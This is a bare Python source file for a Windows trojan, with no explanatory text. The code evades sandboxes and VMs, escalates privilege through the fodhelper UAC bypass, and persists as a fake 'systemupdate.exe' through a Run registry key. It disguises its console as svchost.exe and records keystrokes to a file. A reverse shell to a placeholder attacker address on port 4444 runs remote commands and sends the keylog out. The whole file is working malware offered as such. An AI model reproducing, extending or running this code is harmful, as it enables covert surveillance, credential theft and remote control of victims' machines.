import os
import sys
import subprocess
import socket
import threading
import time
import platform
import ctypes
import winreg
import shutil
import pythoncom
import pyHook
import win32event
import win32api
import win32con
import getpass
import psutil
import random

ATTACKER_IP = '127.0.0.1'
ATTACKER_PORT = 4444
INSTALL_PATH = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\systemupdate.exe'
KEYLOG_FILE = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\keys.txt'
MUTEX_NAME = 'WindowsUpdateMutexEvil'

def is_vm():
    suspicious = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
    for proc in psutil.process_iter():
        if any(vm in proc.name().lower() for vm in suspicious):
            return True
    return False

def uac_bypass():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Classes\\ms-settings\\Shell\\Open\\command', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, INSTALL_PATH)
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)
        subprocess.call('fodhelper.exe', shell=True)
        time.sleep(2)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\\Classes\\ms-settings\\Shell\\Open\\command')
    except:
        pass

def add_persistence():
    if not os.path.exists(INSTALL_PATH):
        shutil.copy(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0], INSTALL_PATH)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, INSTALL_PATH)
    winreg.CloseKey(key)
    uac_bypass()

def hide_console():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
    ctypes.windll.kernel32.SetConsoleTitleW('svchost.exe')

def anti_analysis():
    if is_vm() or 'sandbox' in getpass.getuser().lower():
        sys.exit(0)
    mutex = win32event.CreateMutex(None, False, MUTEX_NAME)
    if win32api.GetLastError() == win32con.ERROR_ALREADY_EXISTS:
        sys.exit(0)

def keylogger():
    def on_keyboard(event):
        with open(KEYLOG_FILE, 'a') as f:
            f.write(chr(event.Ascii) if event.Ascii else f'[{event.Key}]')
        return True
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard
    hm.HookKeyboard()
    pythoncom.PumpMessages()

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            break
        except:
            time.sleep(random.randint(5, 15))
    while True:
        try:
            data = s.recv(2048).decode()
            if data == 'exit':
                break
            elif data.startswith('cd '):
                os.chdir(data[3:])
                s.send(b'Changed dir.\n')
            elif data == 'keylog':
                with open(KEYLOG_FILE, 'rb') as f:
                    s.send(f.read())
            else:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b'No output.')
        except Exception as e:
            s.send(str(e).encode())
    s.close()

def install_and_run():
    anti_analysis()
    add_persistence()
    hide_console()
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=reverse_shell, daemon=True).start()

if __name__ == '__main__':
    if not ctypes.windll.shell32.IsUserAnAdmin():
        uac_bypass()
    install_and_run()
    while True:
        time.sleep(100)
